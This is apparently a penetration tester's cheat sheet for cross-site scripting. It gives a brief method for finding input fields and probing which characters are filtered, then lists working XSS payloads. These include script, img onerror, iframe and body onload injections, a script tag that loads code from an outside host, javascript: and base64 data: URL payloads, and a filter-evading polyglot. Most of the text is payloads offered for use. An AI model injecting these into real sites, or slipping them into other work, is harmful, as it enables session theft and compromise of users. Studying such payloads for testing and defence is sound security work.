# Methadology

1. Find the input places which may also be hidden

2. Test which characters are filtered
	- eg - `qwer>'<"//:=;!--{{7*7}}` 
	- find the response and note which characters were filtered




## Basic Payload Idea

```html
<script>alert('XSS')</script>
<img src=x onerror="javascript:alert('XSS')" >
<iframe src=javascript:alert(1)>
<body onload=alert(1)> 
"><img src=x onerror=prompt(1);>
<script>alert(1)<!- 
<a onmouseover"alert(1)">test</a>
<script src=//example.com/test.js> 
```

- can use in URL input from users

```
javascript:alert('XSS')
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
data:text/html,<script>alert('XSS')</script>
```

- Polyglot

```
javascript:"/*\"/*`/*' /*</template>
</textarea></noembed></noscript></title>
</style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
```